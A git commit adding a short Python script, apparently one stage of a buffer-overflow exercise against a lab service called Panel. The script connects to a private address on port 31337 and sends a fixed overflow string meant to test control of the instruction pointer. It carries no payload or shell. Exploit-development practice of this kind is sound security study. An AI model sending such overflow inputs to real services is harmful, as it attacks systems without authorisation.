807e30582b74d1b0c6ec724b0747cecec5b4ee63
Vry4n <46062162+vry4n@users.noreply.github.com>
2021-02-11 10:54:04 -0600

    Create BoF-Panel-4.py

---
+++ BoF-Panel-4.py
@@ -0,0 +1,15 @@
+#!/usr/bin/python
+import socket
+
+# Part 3 of proof of concept by Vry4n
+# This script is intended send a pattern created with Metasploit pattern_create.rb script
+
+FUZZ = 'A' * 120
+RIP = "B" * 4
+
+print("Fuzzing with {} bytes".format(len(FUZZ)))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect(("192.168.0.13", 31337))
+s.recv(1024)
+s.send(FUZZ.encode() + RIP.encode())
+s.close()
